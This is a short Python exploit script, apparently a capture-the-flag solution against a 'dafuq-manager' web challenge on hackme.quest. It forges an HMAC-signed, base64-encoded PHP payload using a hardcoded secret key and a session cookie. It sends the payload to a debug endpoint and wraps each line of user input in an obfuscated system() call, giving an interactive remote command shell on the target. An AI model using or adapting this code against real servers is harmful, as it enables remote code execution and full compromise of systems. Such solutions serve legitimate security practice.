import hmac
import base64
import hashlib
import requests

def command(cmd):
    _hmac = hmac.new(b'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3', cmd, hashlib.sha256).hexdigest()
    # hmac = hash_hmac('sha256', cmd, 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3')
    return ('{}.{}'.format(base64.b64encode(cmd).decode('utf-8'), _hmac))

def sendRequest(command):
    url = 'https://dafuq-manager.hackme.quest/index.php?action=debug&action2=adduser&order=name&srt=yes&dir[]=magically&command=' + command
    cookies = {
        'PHPSESSID': 'ee07ibn4fme35npckkkftnolb6'
    }

    print(requests.get(url, cookies=cookies).text)

while True:
    sendRequest(command('''('sys'.'tem')('{}');'''.format(input()).encode('utf-8')))